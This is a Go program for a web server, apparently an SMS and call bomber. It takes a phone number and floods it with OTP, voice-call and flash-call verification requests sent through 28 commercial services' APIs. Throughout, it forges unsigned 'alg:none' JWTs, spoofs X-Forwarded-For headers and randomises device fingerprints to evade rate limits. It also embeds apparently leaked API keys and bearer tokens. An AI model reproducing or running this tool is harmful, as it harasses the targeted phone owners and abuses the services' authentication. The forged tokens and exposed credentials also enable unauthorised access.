package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

// ========================
// Structures
// ========================
type API struct {
	Name    string
	URL     string
	Method  string
	Headers map[string]string
	Body    string
}

type APIResult struct {
	Name       string   `json:"name"`
	StatusCode int      `json:"status_code"`
	Response   string   `json:"response"`
	Error      string   `json:"error,omitempty"`
	Attempts   []string `json:"attempts"`
}

type ExecutorResponse struct {
	Success    bool        `json:"success"`
	Mobile     string      `json:"mobile"`
	TotalAPIs  int         `json:"total_apis"`
	SuccessAPI int         `json:"success_apis"`
	Results    []APIResult `json:"results"`
	Timestamp  string      `json:"timestamp"`
}

// ========================
// Helpers
// ========================
func base64urlEncode(str string) string {
	s := base64.StdEncoding.EncodeToString([]byte(str))
	s = strings.ReplaceAll(s, "+", "-")
	s = strings.ReplaceAll(s, "/", "_")
	s = strings.TrimRight(s, "=")
	return s
}

func generateUUID() string {
	return fmt.Sprintf("%04x%04x-%04x-%04x-%04x-%04x%04x%04x",
		rand.Intn(0xffff), rand.Intn(0xffff), rand.Intn(0xffff),
		rand.Intn(0x0fff)|0x4000, rand.Intn(0x3fff)|0x8000,
		rand.Intn(0xffff), rand.Intn(0xffff), rand.Intn(0xffff))
}

func randomAndroidId() string {
	out := ""
	for i := 0; i < 8; i++ {
		out += fmt.Sprintf("%04x", rand.Intn(0xffff))
	}
	return out
}

func randomDeviceId() string { return randomAndroidId() }

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255)+1, rand.Intn(256), rand.Intn(256), rand.Intn(255)+1)
}

func randomUserAgent() string {
	android := []string{"9", "10", "11", "12", "13", "14"}[rand.Intn(6)]
	chrome := []string{"120", "121", "122", "123", "124", "125", "126", "127", "128", "129", "130", "131", "132", "133", "134", "135", "136", "137", "138", "139", "140", "141", "142", "143", "144", "145", "146", "147", "148"}[rand.Intn(29)]
	models := []string{"RMX3081", "SM-G998B", "Pixel 6", "OnePlus 9", "SM-A528B", "M2012K11AG", "SM-N986B", "Redmi Note 10", "SM-G991B", "Pixel 5"}
	model := models[rand.Intn(len(models))]
	builds := []string{"RKQ1.211119.001", "SP1A.210812.016", "TP1A.220624.014", "TQ3A.230901.001"}
	build := builds[rand.Intn(len(builds))]
	return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s Build/%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s.0.0.0 Mobile Safari/537.36", android, model, build, chrome)
}

func randomOkhttp() string {
	return fmt.Sprintf("okhttp/%d.%d.%d", rand.Intn(2)+3, rand.Intn(10), rand.Intn(10))
}

func generateAstroyogiToken() string {
	header := `{"alg":"none","typ":"JWT"}`
	now := time.Now().Unix()
	payload := fmt.Sprintf(`{"UserType":"TtaAppUser","EntityId":"29426901","SourceUserType":"TtaAppUser","SourceEntityId":"29426901","nbf":%d,"exp":%d}`, now, now+7776000)
	return base64urlEncode(header) + "." + base64urlEncode(payload) + "."
}

func generateAstroyogiWebToken() string {
	header := `{"alg":"none","typ":"JWT"}`
	now := time.Now().Unix()
	payload := fmt.Sprintf(`{"UserType":"WebUser","EntityId":"0","SourceUserType":"","SourceEntityId":"","nbf":%d,"exp":%d}`, now, now+7776000)
	return base64urlEncode(header) + "." + base64urlEncode(payload) + "."
}

func randomDevice() map[string]string {
	devices := []map[string]string{
		{"model": "Redmi 6", "idname": "cereus", "manufacturer": "Xiaomi"},
		{"model": "Redmi Note 8", "idname": "ginkgo", "manufacturer": "Xiaomi"},
		{"model": "SM-G998B", "idname": "o1s", "manufacturer": "samsung"},
		{"model": "Pixel 6", "idname": "oriole", "manufacturer": "Google"},
		{"model": "OnePlus 9", "idname": "lemonade", "manufacturer": "OnePlus"},
	}
	return devices[rand.Intn(len(devices))]
}

func randomOperator() map[string]string {
	ops := []map[string]string{
		{"name": "JIO 4G — Jio", "mcc": "405", "mnc": "863"},
		{"name": "Airtel — Airtel", "mcc": "404", "mnc": "10"},
		{"name": "Vi India — Vi", "mcc": "404", "mnc": "22"},
		{"name": "BSNL — BSNL", "mcc": "404", "mnc": "34"},
	}
	return ops[rand.Intn(len(ops))]
}

func randomNetwork() string {
	return []string{"Not Connected", "WIFI", "MOBILE", "4G", "5G"}[rand.Intn(5)]
}

func randomBattery() string { return fmt.Sprintf("%d%%", rand.Intn(86)+10) }
func randomOS() string      { return fmt.Sprintf("%d", rand.Intn(6)+9) }

// ========================
// Call API
// ========================
func callAPI(api API, maxRetries int) APIResult {
	result := APIResult{Name: api.Name, Attempts: []string{}}

	for i := 0; i < maxRetries; i++ {
		req, err := http.NewRequest(api.Method, api.URL, bytes.NewBufferString(api.Body))
		if err != nil {
			result.Error = err.Error()
			return result
		}
		for k, v := range api.Headers {
			req.Header.Set(k, v)
		}

		client := &http.Client{Timeout: 30 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			result.Error = err.Error()
			result.Attempts = append(result.Attempts, fmt.Sprintf("Attempt %d: Error", i+1))
			if i < maxRetries-1 {
				time.Sleep(time.Duration(500*(i+1)) * time.Millisecond)
			}
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		result.StatusCode = resp.StatusCode
		result.Response = string(body)
		result.Attempts = append(result.Attempts, fmt.Sprintf("Attempt %d: HTTP %d", i+1, resp.StatusCode))

		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			return result
		}
		if resp.StatusCode >= 400 && resp.StatusCode < 500 && resp.StatusCode != 429 {
			return result
		}
		if i < maxRetries-1 {
			time.Sleep(time.Duration(500*(i+1)) * time.Millisecond)
		}
	}
	return result
}

// ============================================================
// ALL 28 APIs MIXED (8 + 20, no duplicate)
// ============================================================
func getAllAPIs(mobile string) []API {
	clean := strings.Map(func(r rune) rune {
		if r >= '0' && r <= '9' {
			return r
		}
		return -1
	}, mobile)

	apis := []API{}

	// ========== 1: MatePaisa ==========
	apis = append(apis, API{
		Name:   "MatePaisa (Desisplit)",
		URL:    "https://gaeood-refaces.desisplit.com/nhcxs/qkirtt/gmthhn/rjbwl",
		Method: "POST",
		Headers: map[string]string{
			"user-agent": "Dart/3.9 (dart:io)", "accept-encoding": "gzip",
			"csvdklegslngcfietkzyw": "fdafd5267582605c", "content-type": "application/json",
			"oqvudsrubclnkbxqkqkf": "1", "xegotqrowslanqjbqnq": "MatePaisa",
			"svmdfygmarquc": "941079135e3105516b8bae927b6c21b2", "charset": "utf-8",
			"host": "gaeood-refaces.desisplit.com",
			"qddvjvvmcpunrdqb": "com.matepaisa.credit.loantransaction.loantracker",
			"sdvlwapniboft": "", "zhfhtdjokwefdamtpcn": generateUUID(),
			"craloswbfujlvad": "1",
		},
		Body: `{"bglRycyMysat":"` + clean + `"}`,
	})

	// ========== 2: Sinch ==========
	dev := randomDevice()
	op := randomOperator()
	sinchBody := map[string]interface{}{
		"identity":          map[string]string{"endpoint": "+91" + clean, "type": "number"},
		"honourEarlyReject": true,
		"custom":            nil,
		"reference":         nil,
		"metadata": map[string]interface{}{
			"os": randomOS(), "platform": "Android", "sdk": "2.1.7", "buildFlavor": "production",
			"device":       map[string]string{"model": dev["model"], "idname": dev["idname"], "manufacturer": dev["manufacturer"]},
			"simCardsInfo": map[string]interface{}{"1": map[string]interface{}{"sim": nil, "operator": map[string]interface{}{"countryId": "in", "name": op["name"], "isRoaming": false, "mcc": op["mcc"], "mnc": op["mnc"]}}, "count": 1},
			"simState": "SIM_STATE_READY", "defaultLocale": "en_IN",
			"permissions": map[string]bool{"READ_PHONE_STATE": true, "READ_CALL_LOG": true, "CALL_PHONE": true, "READ_SMS": true, "RECEIVE_SMS": true, "ACCESS_NETWORK_STATE": true, "getCellularSignalLevel": false},
			"networkInfo": map[string]interface{}{"isVoiceCapable": true, "data": map[string]string{"type": randomNetwork()}},
			"batteryLevel": randomBattery(), "version": 2, "simCardCount": 1,
		},
		"method": "flashCall",
	}
	sinchJSON, _ := json.Marshal(sinchBody)
	apis = append(apis, API{
		Name: "Sinch Verification (Flash Call)",
		URL:  "https://verificationapi-v1.sinch.com/verification/v1/verifications", Method: "POST",
		Headers: map[string]string{"host": "verificationapi-v1.sinch.com", "authorization": "Application 7a57152c-ac30-4ed5-95ca-3bb3c1b562c2", "content-type": "application/json; charset=utf-8", "accept-encoding": "gzip", "user-agent": randomOkhttp()},
		Body:    string(sinchJSON),
	})

	// ========== 3: Beato ==========
	apis = append(apis, API{
		Name: "Beato (IVR OTP)", URL: "https://api.beatoapp.com/v7/onboarding/generateotp", Method: "POST",
		Headers: map[string]string{"host": "api.beatoapp.com", "os": "Android", "appname": "beato", "appversion": fmt.Sprintf("4.00.226-%d", rand.Intn(900)+100), "key": generateUUID(), "devicemodel": "Redmi 6Xiaomi9", "content-type": "application/json; charset=utf-8", "accept-encoding": "gzip", "user-agent": randomOkhttp()},
		Body:    `{"email":"","isdcode":"+91","otptype":"ivr","phone":"` + clean + `","resend":true}`,
	})

	// ========== 4: InstantFunds ==========
	apis = append(apis, API{
		Name: "InstantFunds - Voice OTP", URL: "https://instantfunds.in/api/requestVoiceOTP", Method: "POST",
		Headers: map[string]string{"Authorization": "Basic U2VkdWYzMFpXQ0NuNWR1VlRJcjc6NWJFNlRBRnBTc1VuVGpyT0xjYWo=", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Redmi 6 MIUI/V11.0.5.0.PCGMIXM)", "Host": "instantfunds.in", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"},
		Body:    "mobile=" + clean,
	})

	// ========== 5: Zodapp ==========
	apis = append(apis, API{
		Name: "Zodapp - Voice OTP", URL: "https://live.api.zodapp.com/api/auth/register", Method: "POST",
		Headers: map[string]string{"user-agent": "Dart/3.13 (dart:io)", "content-type": "application/json", "accept": "application/json", "accept-encoding": "gzip", "host": "live.api.zodapp.com"},
		Body:    `{"phone":"+91` + clean + `","method":"voice"}`,
	})

	// ========== 6: Lyft Voice ==========
	lyftHeaders := map[string]string{
		"host": "api.lyft.com", "accept": "application/x-protobuf,application/json",
		"x-idl-source": "pb.api.endpoints.v1.phone_auth.CreatePhoneAuthRequest",
		"authorization": "Bearer mVkzh3Xqz8WNZB4xT6+IDd2DmSlJvobXDQSNbq/cmgdKA7lz8xj7hSZe8CknU3lLwzqDtf4OYZYhLM9sbuNX6iV1ETsuHepsbXr88r39lDW+4F1lHW4TG9U=",
		"x-session": "eyJhIjoiZDFiMzY1YzkyM2VkZjUwNiIsImYiOiJmN2IyN2ZiYS0zYmNjLTQ4YWQtOTk2NC02ZTg1MzM3NGM3MzUiLCJoIjp0cnVlLCJrIjoiMzY1NTNiZTktNGNlOS00ZjQ2LWFjODItY2JkOGNiY2ZiZjk4In0=",
		"x-client-session-id": "b5190005-35e5-416a-95d6-e5c80b466622",
		"accept-language": "en_IN", "user-device": "Xiaomi Redmi 6",
		"user-agent": "lyft:android:9:2026.18.3.1778656910",
		"x-locale-language": "en", "x-locale-region": "IN",
		"x-device-density": "320", "x-design-id": "X",
		"x-location": "22.9620185,75.2019773",
		"x-timestamp-ms": fmt.Sprintf("%d", time.Now().UnixMilli()),
		"x-timestamp-source": "system", "x-distance-unit": "kilometers",
		"x-lyft-geo-region": "GEO_REGION_UNKNOWN",
		"content-type": "application/json;messageType=pb.api.endpoints.v1.phone_auth.CreatePhoneAuthRequest; charset=utf-8",
		"accept-encoding": "gzip",
	}
	apis = append(apis, API{
		Name: "Lyft - Voice Verification", URL: "https://api.lyft.com/v1/phoneauth", Method: "POST",
		Headers: lyftHeaders,
		Body:    `{"phone_number":"+91` + clean + `","voice_verification":true,"message_format":"sms_basic","client_configuration":"release"}`,
	})

	// ========== 7: Lyft SMS ==========
	lyftHeaders2 := map[string]string{}
	for k, v := range lyftHeaders {
		lyftHeaders2[k] = v
	}
	lyftHeaders2["x-timestamp-ms"] = fmt.Sprintf("%d", time.Now().UnixMilli())
	apis = append(apis, API{
		Name: "Lyft - SMS Verification", URL: "https://api.lyft.com/v1/phoneauth", Method: "POST",
		Headers: lyftHeaders2,
		Body:    `{"phone_number":"+91` + clean + `","voice_verification":false,"message_format":"sms_android_retriever","client_configuration":"release"}`,
	})

	// ========== 8: KishanSeva ==========
	apis = append(apis, API{
		Name: "KishanSeva AI - Send OTP", URL: "https://kishanseva-ai.onrender.com/auth/send-otp", Method: "POST",
		Headers: map[string]string{"user-agent": "Dart/3.10 (dart:io)", "content-type": "application/json", "accept-encoding": "gzip", "host": "kishanseva-ai.onrender.com"},
		Body:    `{"phone":"+91` + clean + `","purpose":"signup"}`,
	})

	// ========== 9: Astroyogi GenerateOtpV3 ==========
	form9 := url.Values{}
	form9.Set("MobileNumber", clean)
	form9.Set("PhonCode", "91")
	form9.Set("CountryCode", "IN")
	form9.Set("Plateform", "Android")
	form9.Set("IsResend", "false")
	form9.Set("PhoneDeviceId", randomDeviceId())
	apis = append(apis, API{
		Name: "Astroyogi GenerateOtpV3", URL: "https://chapp.astroyogi.com/api/UserAccountV3/GenerateOtpV3", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded", "authorization": "Bearer " + generateAstroyogiToken(), "User-Agent": randomUserAgent(), "X-Forwarded-For": randomIP()},
		Body:    form9.Encode(),
	})

	// ========== 10: Astroyogi Voice ==========
	body10, _ := json.Marshal(map[string]interface{}{"countryCode": "IN", "mobileNumber": clean, "phoneCode": "91", "phoneDeviceId": randomDeviceId(), "platform": "Android", "requestType": "call"})
	apis = append(apis, API{
		Name: "Astroyogi SendOtp (Voice)", URL: "https://comm.astroyogi.com/api/OtpComm/SendOtp", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/json", "authorization": "Bearer " + generateAstroyogiToken(), "User-Agent": randomUserAgent(), "X-Forwarded-For": randomIP()},
		Body:    string(body10),
	})

	// ========== 11: Astroyogi Web ==========
	body11, _ := json.Marshal(map[string]interface{}{"phoneCode": "91", "countryCode": "IN", "mobileNumber": clean, "platform": "Web", "IpAddress": randomIP(), "requestType": "call", "countryCodeByHeader": "IN"})
	apis = append(apis, API{
		Name: "Astroyogi SendOtp (Web)", URL: "https://comm.astroyogi.com/api/OtpComm/SendOtp", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/json", "authorization": "Bearer " + generateAstroyogiWebToken(), "User-Agent": randomUserAgent(), "X-Forwarded-For": randomIP()},
		Body:    string(body11),
	})

	// ========== 12: Zomato SMS ==========
	form12 := url.Values{}
	form12.Set("number", clean)
	form12.Set("country_id", "1")
	form12.Set("lc", "26fd3c9af2914791b566f84867425876")
	form12.Set("type", "initiate")
	form12.Set("verification_type", "sms")
	form12.Set("package_name", "com.application.zomato")
	form12.Set("message_uuid", "")
	apis = append(apis, API{
		Name: "Zomato SMS Verification", URL: "https://accounts.zomato.com/login/phone", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded", "X-Forwarded-For": randomIP()},
		Body:    form12.Encode(),
	})

	// ========== 13: Zomato Call ==========
	form13 := url.Values{}
	form13.Set("number", clean)
	form13.Set("country_id", "1")
	form13.Set("lc", "26fd3c9af2914791b566f84867425876")
	form13.Set("type", "initiate")
	form13.Set("verification_type", "call")
	form13.Set("package_name", "")
	form13.Set("message_uuid", "sms-service-v2-"+generateUUID())
	apis = append(apis, API{
		Name: "Zomato Call Verification", URL: "https://accounts.zomato.com/login/phone", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded", "X-Forwarded-For": randomIP()},
		Body:    form13.Encode(),
	})

	// ========== 14: Udaan WhatsApp ==========
	form14 := url.Values{}
	form14.Set("mobile", clean)
	apis = append(apis, API{
		Name: "Udaan - WhatsApp OTP", URL: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "X-Forwarded-For": randomIP()},
		Body:    form14.Encode(),
	})

	// ========== 15: Udaan Call ==========
	form15 := url.Values{}
	form15.Set("mobile", clean)
	apis = append(apis, API{
		Name: "Udaan - Call OTP", URL: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&getOTPCall=true&whatsappConsent=false", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "X-Forwarded-For": randomIP()},
		Body:    form15.Encode(),
	})

	// ========== 16: Clovia ==========
	body16, _ := json.Marshal(map[string]interface{}{"phone": clean, "is_signup": "true", "email": "", "otp": ""})
	apis = append(apis, API{
		Name: "Clovia - OTP on Call", URL: "https://www.clovia.com/api/v4/users/send-otp-on-call/", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/json", "secretkey": "_fxv&8)36e@kb8na3nj@azl@hzdkfmpaf)lf0+!kt4tu!=feea", "apikey": "u(ihlye!wv)d6zpiyp@qxyqwlt)86#o%v^t%@ki-i@bm+18x7g", "User-Agent": randomUserAgent(), "X-Forwarded-For": randomIP()},
		Body:    string(body16),
	})

	// ========== 17: Swiggy ==========
	body17, _ := json.Marshal(map[string]string{"mobile": clean})
	apis = append(apis, API{
		Name: "Swiggy - Call Verification", URL: "https://profile.swiggy.com/api/v3/app/request_call_verification", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "X-Forwarded-For": "192.168.1.100"},
		Body:    string(body17),
	})

	// ========== 18: IndiaLends ==========
	form18 := url.Values{}
	form18.Set("MobileNumber", clean)
	form18.Set("Mode", "2")
	apis = append(apis, API{
		Name: "IndiaLends - Resend OTP", URL: "https://indialends.com/pl/SP_MVResend", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "sec-ch-ua-platform": `"Android"`, "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36", "accept": "*/*", "sec-ch-ua": `"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"`, "sec-ch-ua-mobile": "?1", "origin": "https://indialends.com", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://indialends.com/personal-loan", "accept-encoding": "gzip, deflate, br, zstd", "accept-language": "en-GB,en-US;q=0.9,en;q=0.8", "priority": "u=1, i"},
		Body:    form18.Encode(),
	})

	// ========== 19: PenPencil ==========
	body19, _ := json.Marshal(map[string]string{"organizationId": "5eb393ee95fab7468a79d189", "mobile": clean})
	apis = append(apis, API{
		Name: "PenPencil - Resend OTP", URL: "https://api.penpencil.co/v1/users/resend-otp?smsType=2", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/json", "user-agent": "okhttp/3.9.1", "accept": "*/*", "accept-encoding": "gzip, deflate, br"},
		Body:    string(body19),
	})

	// ========== 20: Happi ==========
	body20, _ := json.Marshal(map[string]string{"phone": clean})
	apis = append(apis, API{
		Name: "Happi Mobiles - Login", URL: "https://dev-services.happimobiles.com/api/user-login/homepage", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "X-Forwarded-For": "192.168.1.100"},
		Body:    string(body20),
	})

	// ========== 21: Smartcoin ==========
	body21, _ := json.Marshal(map[string]interface{}{"phone_number": clean, "app_version": fmt.Sprintf("100%d", rand.Intn(100)+100), "channel": "IVR", "request_type": "REGISTRATION", "onboarding_consent": true})
	apis = append(apis, API{
		Name: "Smartcoin - OTP Request", URL: "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/json", "X-Forwarded-For": randomIP()},
		Body:    string(body21),
	})

	// ========== 22: HeyoPhone ==========
	body22, _ := json.Marshal(map[string]string{"country_code": "+91", "number": clean, "via": "call"})
	apis = append(apis, API{
		Name: "HeyoPhone - Voice OTP", URL: "https://api.heyophone.com/heyo/v1/otp/send", Method: "POST",
		Headers: map[string]string{"User-Agent": "okhttp/4.12.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip", "Content-Type": "application/json", "x-requested-with": "XMLHttpRequest", "x-device-id": "f461d071a6b39dff", "x-device-type": "android"},
		Body:    string(body22),
	})

	// ========== 23: Dreamplug ==========
	body23, _ := json.Marshal(map[string]string{"channel": "voice", "phone": "+91" + clean})
	apis = append(apis, API{
		Name: "Dreamplug - Resend OTP", URL: "https://app-prod.dreamplug.in/otp/v2/resend", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/json; charset=UTF-8", "x-request-id": generateUUID(), "x-transaction-id": generateUUID(), "x-session-id": generateUUID(), "x-installation-id": generateUUID(), "x-device-id": generateUUID(), "x-application-id": generateUUID(), "x-os": "android", "x-os-version": fmt.Sprintf("%d", rand.Intn(6)+9), "x-os-api-level": fmt.Sprintf("%d", rand.Intn(7)+28), "x-app-version": "4.8.5.4", "x-app-version-code": "40805004", "user-agent": randomOkhttp(), "X-Forwarded-For": randomIP()},
		Body:    string(body23),
	})

	// ========== 24: Magicpin Send ==========
	body24, _ := json.Marshal(map[string]interface{}{"phone_no": "91" + clean, "sms_service_flag": "0", "app-version-name": fmt.Sprintf("1.%d.%d", rand.Intn(100)+100, rand.Intn(10)), "app-version": rand.Intn(1000) + 1000})
	apis = append(apis, API{
		Name: "Magicpin - Send OTP V2", URL: "https://auth.magicpin.in/SendOtp/V2/", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/json; charset=UTF-8", "User-Agent": randomOkhttp(), "package-name": "com.magicpin.local", "X-Forwarded-For": randomIP()},
		Body:    string(body24),
	})

	// ========== 25: Magicpin Call ==========
	body25, _ := json.Marshal(map[string]interface{}{"phone_no": "91" + clean, "app-version-name": fmt.Sprintf("1.%d.%d", rand.Intn(100)+100, rand.Intn(10)), "app-version": rand.Intn(1000) + 1000})
	apis = append(apis, API{
		Name: "Magicpin - Send OTP Call", URL: "https://auth.magicpin.in/SendOtpByCall/", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/json; charset=UTF-8", "User-Agent": randomOkhttp(), "package-name": "com.magicpin.local", "X-Forwarded-For": randomIP()},
		Body:    string(body25),
	})

	// ========== 26: Nikita ==========
	body26, _ := json.Marshal(map[string]string{"endpoint": "comm", "phoneNumber": clean, "countryCode": "IN", "phoneCode": "91"})
	apis = append(apis, API{
		Name: "Nikita Worker - OTP Relay", URL: "https://test-api.nikita973280.workers.dev", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/json", "User-Agent": randomUserAgent(), "X-Forwarded-For": randomIP()},
		Body:    string(body26),
	})

	// ========== 27: FreeNow ==========
	rawIncognia := fmt.Sprintf("%06d%06d%06d%06d%06d", rand.Intn(900000)+100000, rand.Intn(900000)+100000, rand.Intn(900000)+100000, rand.Intn(900000)+100000, rand.Intn(900000)+100000)
	body27, _ := json.Marshal(map[string]string{"deviceId": generateUUID(), "phoneAreaCode": "+91", "phoneNumber": clean, "type": "VOICE_CALL"})
	apis = append(apis, API{
		Name: "FreeNow - Voice Call", URL: "https://api.live.free-now.com/signupwithphoneservice/v3/passenger/challenge", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/json", "user-agent": fmt.Sprintf("mytaxi_passenger/13.%d.0_%d ANDROID/%d (RMX3081)", rand.Intn(20)+40, rand.Intn(100)+2800, rand.Intn(4)+11), "incognia-installation-id": base64.StdEncoding.EncodeToString([]byte(rawIncognia)), "session-id": generateUUID(), "x-myt-request-id": generateUUID(), "X-Forwarded-For": randomIP()},
		Body:    string(body27),
	})

	// ========== 28: Chaayos ==========
	body28, _ := json.Marshal(map[string]string{"mobileNumber": clean})
	apis = append(apis, API{
		Name: "Chaayos - IVR Call", URL: "https://dine.chaayos.com/app-crm/v2/crm/v/r2-ivr/1000", Method: "POST",
		Headers: map[string]string{"Content-Type": "application/json", "X-Forwarded-For": randomIP()},
		Body:    string(body28),
	})

	return apis
}

// ========================
// Handlers
// ========================
func homeHandler(w http.ResponseWriter, r *http.Request) {
	html := `<!DOCTYPE html>
<html><head><title>API Executor - 28 APIs</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:Arial;max-width:900px;margin:20px auto;padding:20px;background:#f5f5f5}
h1{color:#333}
input{padding:12px;width:250px;border:2px solid #ddd;border-radius:5px;font-size:16px}
button{padding:12px 30px;background:#007bff;color:#fff;border:none;border-radius:5px;font-size:16px;cursor:pointer;margin-left:10px}
button:hover{background:#0056b3}
form{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 5px rgba(0,0,0,0.1)}
.info{background:#e8f4fd;padding:15px;border-radius:5px;margin:20px 0}
</style></head><body>
<h1>🚀 API Executor - 28 APIs (8 + 20 Mixed)</h1>
<div class="info">
<strong>Total 28 APIs (No Duplicate):</strong>
<ul>
<li>MatePaisa, Sinch, Beato, InstantFunds, Zodapp</li>
<li>Lyft x2, KishanSeva</li>
<li>Astroyogi x3, Zomato x2, Udaan x2, Clovia, Swiggy</li>
<li>IndiaLends, PenPencil, Happi, Smartcoin, HeyoPhone</li>
<li>Dreamplug, Magicpin x2, Nikita, FreeNow, Chaayos</li>
</ul>
</div>
<form method="get" action="/execute">
<label><strong>Enter Mobile Number:</strong></label><br><br>
<input type="text" name="mobile" placeholder="Enter 10 digit" maxlength="10" required>
<button type="submit">Run All 28 APIs</button>
</form></body></html>`
	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(html))
}

func executeHandler(w http.ResponseWriter, r *http.Request) {
	mobile := strings.TrimSpace(r.URL.Query().Get("mobile"))
	clean := strings.Map(func(r rune) rune {
		if r >= '0' && r <= '9' {
			return r
		}
		return -1
	}, mobile)

	w.Header().Set("Content-Type", "application/json")

	if len(clean) != 10 {
		json.NewEncoder(w).Encode(map[string]string{"error": "Enter valid 10-digit mobile"})
		return
	}

	apis := getAllAPIs(clean)
	results := []APIResult{}
	success := 0

	for _, api := range apis {
		res := callAPI(api, 2)
		results = append(results, res)
		if res.StatusCode >= 200 && res.StatusCode < 300 {
			success++
		}
		time.Sleep(200 * time.Millisecond)
	}

	json.NewEncoder(w).Encode(ExecutorResponse{
		Success:    true,
		Mobile:     mobile,
		TotalAPIs:  len(apis),
		SuccessAPI: success,
		Results:    results,
		Timestamp:  time.Now().Format("2006-01-02 15:04:05"),
	})
}

// ========================
// Main
// ========================
func main() {
	rand.Seed(time.Now().UnixNano())

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	http.HandleFunc("/", homeHandler)
	http.HandleFunc("/execute", executeHandler)

	fmt.Printf("🚀 Server running on port %s\n", port)
	fmt.Printf("🌐 http://localhost:%s\n", port)
	fmt.Printf("📱 http://localhost:%s/execute?mobile=9685198958\n", port)
	http.ListenAndServe(":"+port, nil)
}
